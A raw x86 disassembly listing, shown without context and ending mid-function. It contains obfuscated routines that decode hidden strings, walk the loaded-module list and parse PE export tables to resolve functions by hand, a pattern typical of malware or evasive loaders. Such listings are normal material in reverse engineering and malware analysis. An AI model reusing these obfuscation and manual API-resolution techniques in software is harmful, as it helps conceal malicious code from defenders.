  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
